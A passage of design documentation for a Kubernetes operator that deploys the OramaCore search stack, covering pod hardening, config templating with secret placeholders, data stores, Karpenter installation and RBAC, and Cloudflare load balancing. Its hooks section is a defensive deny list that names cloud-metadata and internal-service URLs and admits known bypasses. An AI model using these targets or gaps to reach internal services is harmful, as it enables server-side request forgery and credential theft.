- **SecurityContext baseline.** A conservative **per-container** `securityContext`
  (`allowPrivilegeEscalation: false`, drop **ALL** capabilities, seccomp `RuntimeDefault`) on every
  container — main *and* init/render/wait — safe for essentially all modern images and satisfying the
  cluster's Gatekeeper / Pod Security "baseline". Composes with pod-level settings (e.g. pgAdmin's
  `fsGroup`). Two **capability exceptions** (both found by the on-cluster smoke test, both least-
  privilege — drop ALL then add back only what's needed): a container that binds a **privileged port**
  (<1024 — Envoy and pgAdmin on `:80`) gets `CAP_NET_BIND_SERVICE` back (`containerSecurityContext`
  picks it by port); a **data store** whose image runs a root entrypoint that `chown`s the mounted
  PVC before dropping to a service user (redis/rabbitmq/clickhouse/mongo) gets `CHOWN`, `DAC_OVERRIDE`,
  `FOWNER`, `SETGID`, `SETUID` back (`dataStoreSecurityContext`) — without them the entrypoint
  crash-loops on `chown: Operation not permitted`. The stronger `runAsNonRoot` /
  `readOnlyRootFilesystem` are **deliberately not** blanket
  (they break images that expect root or write to `/`) — rolled out per-component with testing.
- **Graceful shutdown.** `terminationGracePeriodSeconds` per component — stores default **60s**
  (headroom for the SIGTERM flush: AOF fsync, part checkpoint, queue persist), stateless apps **30s**,
  the writer keeps **300s** (index flush). App containers get a `preStop` **`sleep 5`** drain so they
  leave Service endpoints before exiting (a rolling update doesn't drop in-flight requests) — an exec
  sleep, not the native `SleepAction` (only default-on from k8s 1.30), so it's portable.
- **PodDisruptionBudgets + placement.** A **PDB on every workload**: singletons (all stores, the
  writer, single-replica apps) → `maxUnavailable: 0` (block casual eviction; node maintenance handles
  it consciously); replicated sets (readers, multi-replica apps) → `maxUnavailable: 1` (roll one at a
  time). Replicated Deployments also get a **soft topology spread** across nodes
  (`kubernetes.io/hostname`, `whenUnsatisfiable: ScheduleAnyway` so a single-node sandbox still
  schedules). The one-shot **Jobs** (control-DB migrate, demo-seed) get the securityContext + requests
  but no probes/PDB (they're short-lived). **controlDB** delegates pod hardening to its own operator
  (**CNPG** owns its pods' probes/securityContext/PDB).

**Validated on AKS (2026-07-11):** a scoped (`WATCH_NAMESPACE`) smoke deploy of Redis/RabbitMQ/
ClickHouse/Typesense + pgAdmin (`:80`) + Keycloak reached **`Ready 6/6`**, every pod `1/1` with the
baseline applied (probes, per-container securityContext, requests + memory limit, `60s`/`30s` grace,
`maxUnavailable: 0` PDBs); a replicated (`replicas: 2`) Deployment got the soft topology spread + a
`maxUnavailable: 1` PDB; a CR-level `resources` override was honored over the default. The smoke
caught the two capability exceptions above before merge (drop-ALL had crash-looped the stores on
`chown` and would have broken Envoy/pgAdmin's `:80` bind).

## engine (`internal/controller/engine.go`)

Driven by `spec.region.role`:

- **Writer** (primary only) — a `StatefulSet` (1 replica) running `oramasearch/oramacore` (or the
  writer-only image, see **Side-only images** below),
  a `volumeClaimTemplate` for `/app/.data`, and the CR's nodeSelector/tolerations. Service on
  `:8080`. OramaCore itself is CPU; when `writer.gpu` is set the `nvidia.com/gpu: 1` limit goes
  on the **shared embeddings Deployment** (the model inference is the GPU consumer), not here.
- **Readers** (primary + read tiers) — a `Deployment` (`reader.replicas`) with the
  `oramacore` container (the combined or the reader-only image) **+ an Envoy sidecar** (`envoyproxy/envoy:v1.31.2`, `:80 →
  127.0.0.1:8080`, from the generated `envoy.yaml`) when `engine.envoy` is set.
  Service on `:80` (→ Envoy, or → `:8080` if Envoy is off).
- **Embeddings ai-server** — ONE **shared `<cr>-embeddings` Deployment** (gRPC on `:50051`) +
  Service that the writer and all readers reach via `ai_server.host: <cr>-embeddings` (#14) —
  **not** a per-pod sidecar, so the model loads into RAM once instead of once per engine pod. This
  matches OramaCore's reference architecture (`config-docker.yaml` points `ai_server.host` at a
  standalone `python-ai-server`). `embeddingsImage()` resolves the **published**
  `oramasearch/oramacore-ai-server:latest` (or `-cuda` for `writer.gpu`, which also puts the
  `nvidia.com/gpu: 1` limit + the writer's nodeSelector/tolerations on **this** Deployment — the
  embedding model, not OramaCore, is the GPU consumer). Auto-falls back to CPUExecutionProvider on
  a CPU node. **Not** `embeddings-server-py` (the separate HPES / index-manager path). Validated on
  AKS: shared `<cr>-embeddings` pod serving gRPC, writer **1/1** + readers **2/2** (sidecar gone).

  > **Deeper redundancy ([#39](https://github.com/oramasearch/orama-operator/issues/39)):**
  > the `oramacore` image *also* embeds a Python interpreter and loads the embedding models
  > **in-process** per pod ("Building Python service" → "src.embeddings.models: Models loaded"), so
  > each writer/reader still carries a model copy independent of this shared ai-server. Whether to
  > offload those to the shared ai-server (or drop the redundant one) is tracked in #39.
- **Side-only images** ([#308](https://github.com/oramasearch/orama-operator/issues/308)) — the
  published `oramasearch/oramacore` image starts both OramaCore sides in every pod: without the
  overrides below, **every reader also runs a writer** that accepts writes sent to the reader's host
  and publishes them to the stream, and the writer builds a second, reader-side index on its own
  disk. Prod 1 runs side-only v1.2.39 builds instead. Set `spec.images.overrides.oramacore-writer`
  **and** `.oramacore-reader` (by digest) to run them: the writer pod runs the writer image and
  renders `writer.yaml`, and the reader pods run the reader image and render `reader.yaml`. Both or
  neither: one without the other (an empty value counts as unset) fails the reconcile with
  `Ready=False` (`ReconcileError`) before any resource changes; a disabled engine skips the check,
  so it can still be torn down. With both set they win over `overrides.oramacore`; with neither,
  both pods keep the combined image (`overrides.oramacore`, else `<registry>/oramacore:latest`) and
  `config.yaml`, unchanged. `status.conditions[EngineSidesSeparated]` reports which mode runs.
- **Config** — a `ConfigMap` `<cr>-engine-config` with `envoy.yaml` + **full, valid** OramaCore
  configs, matching `oramacore/config-docker.yaml` (`execution_providers: CUDA|CPU` from
  `writer.gpu`). Without side-only images it holds the combined `config.yaml` (`http` / `log` /
  `writer_side` / `reader_side` / `ai_server`), which both pods render. With them it holds
  `writer.yaml` (`http` / `log` / `writer_side` / `ai_server`), rendered by the writer, and
  `reader.yaml` (`http` / `log` / `reader_side` / `ai_server`), rendered by the readers; switching
  modes replaces the data, so the other mode's keys disappear. All three are assembled from the
  same section builders in `engine.go` (`engineCommonYAML`, `writerSideYAML`, `readerSideYAML`,
  `aiServerYAML`), so the sections and stream names are identical in every mode (writer
  `oramacore-writer`/`write`, readers `oramacore-reader`/`reader`).
  The `ai_server` LLM settings come from `spec.llm` (`engine_llm.go`): `ai_server.llm` is the
  default provider's built-in URL, first model and key, `ai_server.remote_llms` one entry per
  provider, and `ai_server.embeddings.automatic_embeddings_selector` the optional selector. Without
  `spec.llm` they are Prod 1's four providers with no selector
  ([crd-reference.md](crd-reference.md#specllm)).
  Every config is a **template** — `master_api_key` is a `'__MASTER_API_KEY__'`, the broker `user`
  and `password` are `'__BROKER_USERNAME__'` and `'__BROKER_PASSWORD__'`, and each provider's
  key a `'__<PROVIDER>_API_KEY__'` placeholder (single-quoted scalars), so **no credential lives in
  the ConfigMap**. A `render-config` **init container** substitutes the real values into the pod's
  template and writes it to a shared `emptyDir`, and OramaCore reads it via
  `CONFIG_PATH=/etc/oramacore/config.yaml`
  (env override can't reach the nested `writer_side.master_api_key` — `config`'s
  `ORAMACORE_` provider splits on `_`). Explicit `secretKeyRef` env entries carry `MASTER_API_KEY`
  from `spec.masterAPIKeySecretRef` (only where the side's template holds it), the broker
  credentials from `<cr>-broker-admin`, and a provider's key from its `apiKeySecretRef`; the other
  provider keys come from `<cr>-engine-secret` (via `envFrom`).
  The script reads each value from its environment variable and escapes it for `sed` and the
  single-quoted scalar, so no value is evaluated, logged or written into the script.
  Each pod template carries `orama.cloud/config-hash`, the SHA-256 of its own unrendered template
  (with side-only images a change to one side's config rolls only that side, a change to a shared
  section such as the LLM settings rolls both; the combined config rolls both), and
  `orama.cloud/llm-secret-hash`, the SHA-256 of the data of `<cr>-engine-secret` and every
  `apiKeySecretRef` Secret, identical on both sides, and `orama.cloud/credentials-hash`, the side's
  broker admin and master key Secrets ([Credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo)).
  The controller watches Secrets and maps a change to every CR that reads it, so a rotated key rolls
  the writer and readers with no restart by hand. Without a usable master key the writer and
  readers are held at zero replicas. The LLM settings and keys are checked before any engine object is
  written: invalid input leaves the running engine untouched with `Ready=False`. All children set
  an owner reference to the CR, so deleting the CR cascade-deletes them.
- **Hooks deny list** ([#306](https://github.com/oramasearch/orama-operator/issues/306)) —
  customer JavaScript hooks run inside OramaCore and may `fetch` outbound; with no allow or deny
  list OramaCore lets them reach any host. `writer_side.hooks` and `reader_side.hooks` are the same
  block in every config (`hooksYAML` in `engine_hooks.go`, embedded by `writerSideYAML` and
  `readerSideYAML`), so the combined, writer-only and reader-only templates all carry it and
  `orama.cloud/config-hash` rolls the pods when it changes. The values are fixed, with no CR field:
  `evaluation_timeout: 200ms`, `execution_timeout: 1s` (Prod 1's), and `denied_domains` only
  (OramaCore refuses `allowed_domains` next to it). The list, 65 entries in this order without
  duplicates:
  1. Prod 1's 32 entries as written (orama-deploy `655f1a2`, `oramacore/production/config/`
     `writer.config.yaml` and `reader.config.yaml`): loopback, RFC 1918, link-local and cloud
     metadata, carrier-grade NAT, multicast and reserved, unspecified and broadcast, TEST-NETs,
     benchmarking and the listed private IPv6 patterns. These are glob patterns, not a complete
     CIDR filter.
  2. A `**` form of each Prod 1 entry ending in `.*` (`10.**`, `169.254.**`, `172.1[6-9].**`, …).
  3. The cluster's names: `*.svc`, `*.svc.cluster.local`, `*.cluster.local`, `kubernetes*`,
     `*.internal`, their `**` forms, `::ffff:*` (IPv4-mapped IPv6, which the URL parser keeps in
     hex, e.g. `::ffff:a00:1`, so no IPv4 pattern sees it) and `::`.
  4. The stack's own Service names, `<cr>-*` and `<cr>-*.**`.

  Matching is `orama-js-pool` 0.4.3's
  ([`src/permission.rs`](https://docs.rs/crate/orama-js-pool/0.4.3/source/src/permission.rs),
  `check_net_url` / `glob_match`): it matches the URL's **host string**, never the resolved
  address, case-insensitively, with and without the port. `.` separates labels, so `*` stays
  within one label and `**` spans several: Prod 1's `10.*` does not match `10.0.0.1`, which is why
  step 2 adds `10.**`. A refused call fails in the hook with `Domain not allowed`, so a hook cannot
  reach `http://169.254.169.254/`, `http://10.0.0.1/`, `http://<cr>-controldb-rw:5432/` or
  `http://<cr>-controldb-rw.<ns>.svc.cluster.local:5432/`. **Limits:** a public DNS name that
  resolves to a private address passes this check, and so does another stack's Service addressed
  as `<svc>.<ns>`. Reachability after resolution is enforced by the engine's network sandbox
  ([Network sandboxes](#network-sandboxes-internalcontrollernetworksandbox_controllergo)) and the
  secure networking work in [#437](https://github.com/oramasearch/orama-operator/issues/437), not
  by this list.
- **Writer JWT provider** ([#384](https://github.com/oramasearch/orama-operator/issues/384)) —
  with `engine.writer.jwt` set, `writerSideYAML` ends with `writerJWTYAML` (`engine_jwt.go`): one
  `dashboard` JWKS provider whose `issuers` is `[jwtIssuer(oc)]`, the dashboard's own `JWT_ISSUER`,
  whose `audiences` are `engine.writer.jwt.audiences` in order without duplicates, and whose
  `jwks_url` defaults to the dashboard Service in the same namespace,
  `http://<cr>-dashboard:3000/api/.well-known/jwks.json` (the dashboard serves it from
  `JWT_PUBLIC_KEY`). Every string is a quoted, escaped YAML scalar. The combined and writer-only
  configs carry it, the reader-only config does not, and the block is in the hashed template, so a
  change rolls the writer only (both pods in combined mode). `validateWriterJWT` runs in
  `reconcileEngine` before any engine object is written and refuses an empty issuer, no audience,
  an empty or over-long field, and an unusable JWKS URL
  ([crd-reference.md](crd-reference.md#speccomponentsenginewriterjwt)). Unset, the config has no
  `jwt` block, as before. **Tokens Prod 1 issued** do not verify here: this stack signs with its
  own key, so the writer rejects them, expired or not. The dashboard signs each one for 10 minutes
  (`expiresIn: '10m'` in `src/app/api/user/jwt/route.ts`), and `@orama/core` 1.2.19 asks for a new
  one before every request.
- **Graceful shutdown** — OramaCore handles SIGTERM (drains HTTP, then force-commits
  BOTH sides to disk — `oramacore/src/lib.rs`, `web_server/mod.rs`; `CMD ["./oramacore"]`
  = PID 1). Because the writer's commit flushes indexes, the writer pod gets
  `terminationGracePeriodSeconds: 300` (readers: 60) so k8s doesn't SIGKILL the flush
  at the default 30s.
- **Health probes** — startup / readiness / liveness all hit `GET /health` on `:8080`
  (`oramacore/src/web_server/api/mod.rs`; also the prod ALB path). The **startup probe**
  (`failureThreshold: 30 × 10s` ≈ 5 min) gates the others so a slow index-load boot
  isn't killed; readiness gates Service routing; liveness restarts a hung pod.
- **Disruption budgets** — the **writer** gets a PDB with `maxUnavailable: 0` (it's a
  singleton — voluntary disruptions like node drains/autoscaler are blocked so it
  isn't casually evicted; **node maintenance must consciously handle it**). **Readers**
  get `maxUnavailable: 1` (roll one at a time, keep the rest serving).

**Validated on AKS (2026-07-08):** applying a `primary` CR created the writer STS
(+ dynamically-provisioned PVC), the reader Deployment, both Services, and the
ConfigMap; the CR reaches **`Phase=Ready`** once every owned workload is ready — a status
roll-up over the live Deployment/StatefulSet + CNPG readiness (`internal/controller/status.go`,
[#37](https://github.com/oramasearch/orama-operator/issues/37)). Phase is
`Progressing | Ready | Degraded` (Degraded = a component regressed after being Ready); it also
exposes `status.componentsReady` (`22/22`, a print column), a **per-component list**
(`status.components[]` — one entry per deployable component, e.g. `writer 1/1`, `broker 1/1` — not
per-pod), and a standard `Ready` condition. The status subresource is **written only on a real
transition** (deep-compared first), so a steady stack generates no control-plane churn. Deleting
the CR GC'd everything. The
`render-config` init container renders the config, and **OramaCore 1.2.28 parses it and
boots** (`Configuration loaded successfully` → `Starting web server on
http://0.0.0.0:8080`); the ConfigMap shows only `master_api_key: '__MASTER_API_KEY__'`
while the rendered file in the pod holds the real value.

> **Follow-ups:** the `embeddings` ai-server image is built by the bridge's
> [`build/images`](https://github.com/oramasearch/orama-cloud-v1-bridge/tree/main/build/images)
> tooling (`oramasearch/embeddings-server-py:{cpu,gpu}-latest`, private Docker Hub — the tag
> is auto-picked from `writer.gpu`; just set `spec.images.pullSecretName`); RabbitMQ
> writer→reader replication (currently in-memory transport, single-node); HPA + the
> reader→primary-writer endpoint on read tiers.

## controlDB (`internal/controller/controldb.go`)

The control-plane Postgres (PlanetScale in prod) as a **CloudNativePG `Cluster`**,
provisioned as an **unstructured** object so the operator stays decoupled from CNPG's
Go types/version. Requires the CNPG operator (installed via the helmfile).

- **Primary** — a fresh cluster, `spec.instances` from the profile (light 1 / medium
  2 / heavy 3), `10Gi` storage, `bootstrap.initdb` creating the `oramacore` database.
- **Read tier** (`role: read`, `replicate: true`) — a **replica cluster** streaming
  from the primary region's `postgresEndpoint` (`spec.replica` + `externalClusters`).
- `mode: external` skips creation (the app uses the external endpoint). Owner ref on
  the `Cluster` → deleting the CR cascade-deletes it (CNPG then removes the pods/PVCs).

**Validated on AKS (2026-07-07):** with the CNPG operator installed, a `medium`
primary CR produced a `Cluster` (instances=2, initdb=`oramacore`, owned by the CR);
CNPG bootstrapped Postgres; deleting the CR GC'd the cluster + its pods.

> **Follow-ups:** the replica cluster's `streaming_replica` credentials/secret wiring;
> exposing storage size + the DB name as CR fields; a Service alias the app can use.

## Data stores — cache / broker / analytics / search (`internal/controller/datastore.go`)

A single generic `reconcileDataStore` provisions each as a **single-node
`StatefulSet` + PVC + Service**, parameterized per store (image, ports, data path,
env). Honors the `DataStoreSpec`: `enabled`, `mode: external` (skip — the app uses
the endpoint), and `placement: central` (only the primary runs it; read tiers skip
and reference the primary's endpoint). Images are overridable via
`spec.images.overrides.<component>`.

| Store | Component | Image | Ports |
|---|---|---|---|
| Redis (`--requirepass` from `<cr>-cache-auth`) | `cache` | `redis:7-alpine` | 6379 |
| RabbitMQ (admin from `<cr>-broker-admin`) | `broker` | `rabbitmq:3.13-management` | 5672, 15672, 5552 |
| ClickHouse | `analytics` | `clickhouse/clickhouse-server:24.8` | 8123, 9000 |
| Typesense | `search` | `typesense/typesense:0.25.2` | 8108 |

**Validated on AKS (2026-07-07):** a CR with all four enabled produced four
StatefulSets + Services + PVCs; **all four pods booted `1/1`**; deleting the CR
removed the workloads.

> **PVC retention:** StatefulSet PVCs are **retained** on delete (the k8s default —
> data is left in place, not auto-deleted). Orphaned PVCs are cleaned up manually.
> (A configurable `delete`-on-teardown option can be added later.)

Each store also gets the **workload-hardening baseline** (startup/readiness/liveness TCP probes, a
per-container securityContext, requests + a generous per-store memory limit, a `60s` grace period,
and a `maxUnavailable: 0` PDB) — see [Workload hardening](#workload-hardening--applied-to-every-component-18).

> **Follow-ups:** these are single-node for light/medium. **Heavy/production** should
> swap in the dedicated operators (Altinity ClickHouse, RabbitMQ cluster-operator) and
> a clustered Typesense; wire credentials via the component secret (the Typesense API key
> is a dev placeholder today; the broker and Redis passwords are generated, see
> [Credentials](#credentials--broker-and-redis-passwords-and-the-master-key-credentialsgo)). Binary-side right-sizing derived from the memory limits (Redis
> `maxmemory`, etc.) is [#42](https://github.com/oramasearch/orama-operator/issues/42).

## App compute — ingestion / workers / dashboard / docs (`app.go`, `ingestion.go`)

A generic `reconcileApp` provisions a stateless **Deployment + Service (+ Ingress if a
host is set)**.

- **ingestion** — `index-builder` Deployment (was Cloud Run); when `harvest` is on,
  also the HARVEST **master** Deployment, a **Mongo** StatefulSet (record store), and a
  **Selenium** grid Deployment.
- **workers** — the ported CF workers as **one bundled image** → a single Deployment
  (`workers.replicas`, image via `workers.image` or `spec.images.overrides.workers`).
- **dashboard** — a Deployment + Service + an **Ingress** on `dashboard.host`. It reads
  `JWT_ISSUER` from the shared ConfigMap through `envFrom`, which a running process does not
  re-read, so its pod template carries `orama.cloud/jwt-issuer-hash`, the SHA-256 of
  `jwtIssuer(oc)`: a change to the effective issuer rolls it. Audience and JWKS URL changes do not.
  The upgrade that adds the annotation rolls the dashboard once.

**Validated on AKS (2026-07-08):** a CR with these enabled produced the 5 Deployments,
the Mongo StatefulSet, the dashboard Ingress, and 6 Services; CR-delete GC'd them.

> **Follow-ups:** images for `index-builder` / `harvest` / `dashboard` / the `workers`
> bundle are **placeholders** (`oramasearch/<name>:latest`) pending published/built
> images — override via `spec.images.overrides`. HARVEST's Podman-per-job worker model
> needs porting to k8s Jobs (the master + Mongo + Selenium are here; the job spawner
> is a follow-up). Dashboard/index-builder need their env + secret wiring
> (control-plane DB URL, API keys) via the component secret.

## DISCO (`disco.go`)

A `Deployment` (in-memory → no PVC; restart cold-starts the cache) running the Go **DISCO** service
(`:8080`), pointed at the **shared `<cr>-embeddings` Deployment** via `EMBEDDINGS_ENDPOINT`
([#14](https://github.com/oramasearch/orama-operator/issues/14)/[#39](https://github.com/oramasearch/orama-operator/issues/39))
instead of a co-located model sidecar (DISCO was the third redundant copy of the model weights).
Routed through the shared `reconcileApp` builder, so it inherits the workload-hardening baseline
(probes, securityContext, resources, PDB, grace). Service on `:8080`. **Validated on AKS.**

## IdP + demoSeed (`idp.go`)

- **idp** — when `idp.provider=keycloak`, deploys **Keycloak** (`Deployment` + Service,
  `start-dev`). `none`/`firebase`/`clerk` are external (nothing deployed). Validated on
  AKS (Keycloak booted `1/1`). Admin creds are dev placeholders → edit the keycloak secret in prod.
- **demoSeed** — when `demoSeed: true`, creates a one-shot **Job** (create-if-absent).
  Today it's a **placeholder** (echo); the real seed will create a demo
  project+index+docs via the API once the engine is Ready. Validated on AKS (Job ran
  to `Complete`).

## Cloudflare (`cloudflare.go`) — 🟡 implemented, not live-tested

Cloudflare stays the permanent edge/geo-LB; the operator reconciles CF **DNS** via the
CF API (raw HTTP): it upserts a proxied record pointing `dashboard.host` at this
cluster's ingress address. **Safe no-op** unless fully configured — `enabled` +
`apiTokenSecretRef` → a Secret with keys `token` + `zoneID` + `accountID` + `manageDNS` + a resolvable
ingress target. The no-op path is validated on AKS (loop stays green with `enabled`
but no token).

> **Follow-ups:** validate against a live Cloudflare account; add **Load Balancing**
> (geo-steered pools + health checks across the regional clusters — the actual
> geo-LB); deprovision records on teardown; surface the managed hostnames beyond just
> the dashboard.

## Zetta elastic capacity (`zetta_capacity.go`) — 🟡 implemented, opt-in, not live-tested

The **first slice** of Zetta-driven elastic capacity ([operator#69](https://github.com/oramasearch/orama-operator/issues/69)):
`Zetta → operator → Karpenter → nodes → more Zetta nodes`. Opt-in via
`OramaZettaCluster.spec.capacity.karpenter.enabled` (default off). Reconciled from the
`OramaZettaCluster` controller (step 0, before the StatefulSet).

- **Owned `NodePool`** — the operator reconciles a Karpenter `NodePool` (`karpenter.sh/v1`)
  via **`unstructured`** (same decoupling as the CNPG `Cluster` — no dependency on Karpenter's
  Go types/version). It carries the cloud-neutral policy: a dedicated **taint**
  (`orama.cloud/zetta:NoSchedule`), the **pool label** (`orama.cloud/zetta-pool`) on the node
  template, `requirements` (os/arch/capacity-type + optional instance-type pin), the **cost cap**
  (`spec.limits` cpu/memory/nodes), and **stateful-safe disruption**
  (`consolidationPolicy: WhenEmpty`, a `nodes: "1"` budget, `expireAfter: Never`,
  `terminationGracePeriod: 1h`). CreateOrUpdate ⇒ the write is a no-op when nothing changed
  (anti-flap, principle #7).
- **Provider `NodeClass` is referenced, not owned** — `spec.capacity.karpenter.nodeClassRef`
  (`{group, kind, name}`) points at the platform's `EC2NodeClass` (EKS) / `AKSNodeClass`
  (AKS NAP). The NodeClass carries cluster-specific cloud details (AMI/subnet/IAM on AWS) the
  operator can't invent, so the platform owns it. `name` is required when enabled; missing ⇒
  `CapacityReady=False, Reason=Blocked`.
- **Scale trigger (this slice)** — pure **scheduling**: the Zetta pods get the matching
  toleration + `nodeSelector: {orama.cloud/zetta-pool: <name>}` (in `mutateZettaStatefulSet`),
  so raising `spec.replicas` past node capacity leaves pods **Pending → Karpenter provisions →**
  the pods schedule and join. The operator changes *desired replicas + NodePool limits*;
  Karpenter does the launch. A **Zetta-signal-driven** trigger (an `orama_control.scale_requests`
  row the operator polls) is the **next** slice — noted, not built.
- **Quorum-safety** — the Zetta pods carry `karpenter.sh/do-not-disrupt` (Karpenter never
  voluntarily evicts a live CRDT peer) + a `maxUnavailable: 1` **PDB**. Drain-safe,
  operator-driven **scale-down** (lower replicas, let Karpenter reclaim the emptied node) is a
  later slice.
- **Karpenter-absent = graceful no-op** — existence is checked via the **RESTMapper** (no
  informer started for a possibly-missing CRD). No `karpenter.sh/v1 NodePool` mapping ⇒
  `CapacityReady=False, Reason=KarpenterNotInstalled`, no crash-loop. Covers bare-metal / k0s
  clusters with no node autoscaler.
- **Cluster-scoped cleanup** — a `NodePool` is **cluster-scoped**, so a namespaced CR can't own
  it via `ownerReferences` (k8s GC would treat the owner as absent and delete it). Instead the
  pool is label-identified and cleaned up by a **finalizer** (`orama.cloud/karpenter-capacity`),
  added while capacity is on and released on disable or CR-delete. The namespaced PDB is
  owner-GC'd normally.
- **Status** — `status.provisionedNodes` (count of nodes labeled
  `karpenter.sh/nodepool=<pool>`, read via the **uncached APIReader** so the operator holds no
  cluster-wide Node informer) + the `CapacityReady` condition, both written only on change
  (anti-flap).

> **RBAC:** `karpenter.sh/nodepools` (`*`), `karpenter.sh/nodeclaims` +
> `karpenter.k8s.aws/ec2nodeclasses` + `karpenter.azure.com/aksnodeclasses` +
> core `nodes` (`get;list;watch`), and `policy/poddisruptionbudgets` — mirrored into
> `chart/templates/rbac.yaml`. A grant for a non-existent apiGroup is harmless.

## Operator-owned Karpenter install (`zetta_capacity_install.go`) — 🟡 implemented, opt-in, not live-tested

The **second slice** of [operator#69](https://github.com/oramasearch/orama-operator/issues/69)
([operator#75](https://github.com/oramasearch/orama-operator/issues/75)), extending the NodePool
work above: the NodePool reconcile *assumes* Karpenter is installed; this makes the operator **own the
install** too. Opt-in via `OramaZettaCluster.spec.capacity.karpenter.install` (default off). Reconciled as
**step 0** of the `OramaZettaCluster` controller, before the NodePool, so the CRDs exist first.

- **Vendored upstream manifests, server-side-applied** — the operator embeds (`go:embed`) the pinned
  **Karpenter v1.13.0** manifests under `internal/controller/assets/karpenter/v1.13.0/` — the CRD bundle
  (`NodePool`/`NodeClaim`/`EC2NodeClass`/`NodeOverlay`) and the controller bundle (ServiceAccount + RBAC +
  Deployment + Service + PDB) — and applies each document as an `unstructured` object via **server-side
  apply** (`client.Apply` + force-ownership). **No Karpenter Go types are vendored** (same decoupling as
  the NodePool reconcile). Re-vendor with [`hack/fetch-karpenter-manifests.sh`](../hack/fetch-karpenter-manifests.sh)
  (a reproducible `helm template` of the upstream OCI charts). Two fields carry placeholders
  (`__CLUSTER_NAME__` / `__CONTROLLER_ROLE_ARN__`); they are **never replaced as text**
  ([operator#79](https://github.com/oramasearch/orama-operator/issues/79)). The reconciler parses the
  template first, then sets the CR's values as structured fields: the ServiceAccount's
  `eks.amazonaws.com/role-arn` annotation and the controller container's `CLUSTER_NAME` env var, each
  found by kind, name and field path and required to hold its placeholder. The rendered bundle must be
  exactly the expected 13 objects (`karpenterControllerObjects` in
  `internal/controller/zetta_capacity_install_render.go`) and the CRD bundle exactly the 4 Karpenter
  CRDs, or nothing is applied.
- **Validated inputs** — `installClusterName` must match the EKS cluster-name rule and
  `controllerRoleARN` must be an IAM role ARN. The CRD schema refuses anything else at admission, and the
  reconciler checks again (a CR stored before the patterns existed): an invalid value gives
  `KarpenterInstalled=False, Reason=InvalidInstallSpec` on every cloud, before the finalizer or any object
  is written.
- **Cloud-gated** — the cloud is detected from a node's `providerID`:
  - **bare-metal / k0s** (no cloud providerID) ⇒ no-op, `KarpenterInstalled=False, Reason=BareMetalNoCloud`.
  - **AKS** ⇒ no-op, `Reason=ManagedByAKSNAP` — Node Auto Provisioning already deploys and manages
    Karpenter; use `enabled` (not `install`) there.
  - **EKS** ⇒ the self-install path proceeds.
- **Cloud IAM prerequisite, surfaced not crashed** — Karpenter's controller needs a cloud identity to
  create VMs, which the in-cluster operator **cannot mint** (a cloud-account prereq, like the image pull
  secret). On EKS the reconciler checks `controllerRoleARN` (the IRSA role) + `installClusterName`
  **before** deploying the controller; if the identity is missing it reports
  `KarpenterInstalled=False, Reason=CloudIdentityMissing` and does **not** deploy (no `CrashLoopBackOff`).
  Full detail: [`docs/karpenter-cloud-iam-prerequisite.md`](karpenter-cloud-iam-prerequisite.md).
- **Cluster-singleton, ref-counted cleanup** — the controller install is shared by every CR that opts in.
  A namespaced CR can't own the cluster-scoped CRDs/ClusterRoles, so cleanup is a **finalizer**
  (`orama.cloud/karpenter-install`) that removes the operator-managed controller resources only when **no
  other** `OramaZettaCluster` still requests the install. **The CRDs are applied but never deleted** on
  teardown — deleting a Karpenter CRD cascades to every `NodePool`/`NodeClaim` in the cluster.
- **Status** — a `KarpenterInstalled` condition (`InvalidInstallSpec` / `BareMetalNoCloud` / `ManagedByAKSNAP` / `UnsupportedCloud`
  / `CloudIdentityMissing` / `InstallClusterNameRequired` → `InstallProgressing` → `Installed`), written
  only on change (anti-flap).

> **RBAC (install):** `apiextensions.k8s.io/customresourcedefinitions` — `get;list;watch` on all,
> `create;update;patch` only on the 4 Karpenter CRD names (**no `delete`**, CRDs aren't GC'd). And
> `rbac.authorization.k8s.io` — `get;list;watch` on all roles and bindings; `create;update;patch;delete`
> plus `bind;escalate` **only on the bundle's names** (`clusterroles` karpenter, karpenter-admin,
> karpenter-core; `clusterrolebindings` karpenter, karpenter-core; `roles` and `rolebindings` karpenter,
> karpenter-dns). Creating RBAC that grants Karpenter's broad permissions needs `bind` + `escalate`, since
> the operator doesn't itself carry every node/pod grant; scoping them by `resourceNames` means the
> operator cannot create, bind or escalate any other role, binding or CRD (operator#79,
> `TestKarpenterInstallEnvtest` proves both halves against a real API server). ServiceAccounts,
> Deployments, Services and PDBs the install creates are already granted. Mirrored into
> `chart/templates/rbac.yaml`; `TestChartKarpenterRBACMatchesBundle` keeps the names in step with the
> bundle, so re-vendoring a Karpenter version that renames an object fails until both are updated.

> **Follow-ups (later slices of #69):** the Zetta→operator signal channel
> (`orama_control.scale_requests`); drain-safe, quorum-aware scale-down; multi-cluster
> placement policy (per-operator identity already namespaces the state); consent-trail
> integration (`add_nodes` / `approve_consent`); live validation on an EKS + AKS-NAP cluster.
> **Follow-ups:** validate against a live Cloudflare account; deprovision records on
> teardown; surface the managed hostnames beyond just the dashboard.

## Cloudflare global Load Balancer (`cloudflareloadbalancer_controller.go`) — 🟡 implemented, not live-tested

The `CloudflareLoadBalancer` CRD ([#73](https://github.com/oramasearch/orama-operator/issues/73))
turns a single hostname into a **global load balancer** — origin pools of wan-accessible
nodes, health checks, geo/proximity steering, and failover — the actual geo-LB. It is the
same "external resource as an owned CRD" shape as `CloudflareDNSRecord`: the child
controller makes the CF API calls and holds a finalizer, so the main loop never mutates
Cloudflare directly. From **one** CR it reconciles three Cloudflare Load Balancing objects:

- a **Health Monitor** (account-scoped) — `type` http/https/tcp, `path` (default
  `/v1/server_info`), `interval`/`timeout`/`retries`, `expectedCodes`; drops unhealthy
  origins from rotation.
- one or more **Origin Pools** (account-scoped) — each a named set of origins
  (`{name, address, enabled, weight}`), `minimumOrigins`, the monitor attached. Pools that
  leave the spec are pruned after the LB stops referencing them.
- the **Load Balancer** (zone-scoped) — the `hostname`, `default_pools` (spec order),
  `fallbackPool`, `steeringPolicy` (`off｜geo｜dynamic｜proximity｜random`; `dynamic` maps to the
  API's `dynamic_latency`), optional `regionPools` (region code → pool names) for geo
  steering, and `proxied`.

**Idempotent + merge-not-clobber:** create-or-adopt (list by our `orama-operator:<ns>/<name>`
description tag / by pool name / by hostname), then **PATCH only the fields we manage** so
server-managed fields are left intact. **Anti-flap (principle #7):** the status subresource
(LB id, monitor id, per-pool ids + health, a `Ready` condition) is written **only on a real
transition** (deep-compare); a steady LB produces zero control-plane writes, refreshed on a
5-minute resync. **Graceful when Load Balancing is off:** a 403/entitlement error →
`Ready=False (LoadBalancingNotEnabled)` + a gentle requeue, never a crash-loop. **Safe no-op**
until the Secret (token+zoneID+accountID) exists → `Ready=False (WaitingForCredentials)`.

